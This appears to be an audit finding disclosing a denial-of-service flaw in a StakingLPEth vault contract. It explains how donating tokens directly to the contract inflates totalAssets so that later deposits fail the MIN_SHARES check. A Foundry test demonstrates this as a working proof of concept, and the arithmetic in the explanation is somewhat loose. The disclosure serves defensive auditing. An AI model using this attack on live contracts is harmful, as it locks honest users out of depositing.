# Vulnerability details

## Impact
Malicious users can transfer liquidity pool token to StakingLPEth contract directly lead to a denial of service (DoS) for StakingLPEth due to the limit shares check
## Proof of Concept
User deposit liquidity pool token to StakingLPEth protocol to get share via invoke external deposit function. Let’s see how share is calculate:

```
function _convertToShares(uint256 assets, Math.Rounding rounding) internal view virtual returns (uint256) {
        return assets.mulDiv(totalSupply() + 10 ** _decimalsOffset(), totalAssets() + 1, rounding);
    }
```
Since `decimalsOffset() == 0` and totalAssets equal the balance of liquidity pool token in this contract
```
function totalAssets() public view virtual override returns (uint256) {
        return _asset.balanceOf(address(this));
    }
```
$$ f(share) = (Amount \ast totalSupply) / (totalAssets() + 1) $$
The minimum share is set to 0.01 ether.
```
uint256 private constant MIN_SHARES = 0.01 ether;
```
Assuming malicious users transfer 1 ether of liquidty pool tokens into the protocol and receive ZERO shares, how much tokens does the next user need to pay if they want to exceed the minimum share limit of  0.01 ether? That would be 1 ether times 0.01 ether, which is a substantial amount.
I add a test case in `StakingLPEthTest`: 
```
function testMinSharesViolation() public{
        address Alice = address(123); 
        address Bob = address(321); 
        liquidityPool.transfer(Alice, 1 ether); 
        liquidityPool.transfer(Bob, 1000 ether); 
        // Assume the malicious user is Alice and transfers 1 ether to stakingLpEth contract
        vm.startPrank(Alice); 
        liquidityPool.transfer(address(stakingLpEth),1 ether); 
        vm.stopPrank(); 
        vm.startPrank(Bob); 
        liquidityPool.approve(address(stakingLpEth),type(uint).max); 
        //1000 ether can't exceed the minimum share limit of 0.01 ether
        vm.expectRevert(StakingLPEth.MinSharesViolation.selector); 
        stakingLpEth.deposit(1000 ether , Bob); 
    }
```
We can see even Bob deposit a substantial number of tokens but still cannot surpass the 0.01 ether share limit which will lead to a denial of service (DoS) for StakingLPEth due to MinShares checks.
